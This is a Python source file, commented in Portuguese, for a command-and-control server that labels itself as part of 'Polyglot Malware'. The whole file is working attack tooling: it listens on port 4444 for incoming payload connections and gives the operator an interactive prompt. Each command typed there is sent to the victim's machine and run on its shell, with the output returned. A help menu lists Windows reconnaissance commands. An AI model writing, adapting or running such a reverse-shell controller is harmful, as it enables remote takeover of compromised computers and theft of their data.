#!/usr/bin/env python3
"""
Simple C2 Server - Polyglot Malware
Recebe conexões dos payloads
"""

import socket
import sys
from datetime import datetime

def start_c2_server(port=4444):
    """Inicia servidor C2"""
    
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', port))
        server.listen(5)
        
        print("=" * 80)
        print("POLYGLOT MALWARE - C2 SERVER")
        print("=" * 80)
        print(f"[*] Servidor iniciado em 0.0.0.0:{port}")
        print(f"[*] Aguardando conexões...")
        print(f"[*] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 80)
        print()
        
        while True:
            try:
                client, address = server.accept()
                print(f"\n[+] Nova conexão de {address[0]}:{address[1]}")
                
                # Recebe informações iniciais
                try:
                    initial_data = client.recv(4096).decode()
                    print(f"[*] Info: {initial_data.strip()}")
                except:
                    pass
                
                # Loop de comandos
                while True:
                    try:
                        cmd = input(f"\n[{address[0]}]> ").strip()
                        
                        if not cmd:
                            continue
                        
                        if cmd.lower() in ['exit', 'quit']:
                            client.send(cmd.encode())
                            print("[*] Encerrando conexão...")
                            break
                        
                        if cmd.lower() == 'disconnect':
                            print("[*] Desconectando...")
                            break
                        
                        # Comandos especiais
                        if cmd.lower() == 'help':
                            print("""
Comandos disponíveis:
  help          - Mostra esta ajuda
  disconnect    - Desconecta do cliente atual
  exit/quit     - Encerra conexão com cliente
  
Comandos Windows:
  dir           - Lista arquivos
  cd <path>     - Muda diretório
  type <file>   - Mostra conteúdo de arquivo
  whoami        - Mostra usuário atual
  systeminfo    - Info do sistema
  ipconfig      - Configuração de rede
  tasklist      - Processos rodando
  
Qualquer outro comando será executado no shell da vítima.
                            """)
                            continue
                        
                        # Envia comando
                        client.send(cmd.encode())
                        
                        # Recebe resposta
                        response = client.recv(65536).decode(errors='ignore')
                        print(response)
                        
                    except KeyboardInterrupt:
                        print("\n[*] Ctrl+C detectado")
                        break
                    except Exception as e:
                        print(f"[-] Erro: {e}")
                        break
                
                client.close()
                print(f"[-] Conexão encerrada: {address[0]}:{address[1]}")
                
            except KeyboardInterrupt:
                print("\n[*] Encerrando servidor...")
                break
            except Exception as e:
                print(f"[-] Erro: {e}")
        
        server.close()
        print("[*] Servidor encerrado")
        
    except Exception as e:
        print(f"[-] Erro ao iniciar servidor: {e}")
        sys.exit(1)

def main():
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    else:
        port = 4444
    
    try:
        start_c2_server(port)
    except KeyboardInterrupt:
        print("\n[*] Interrompido pelo usuário")
        sys.exit(0)

if __name__ == "__main__":
    main()
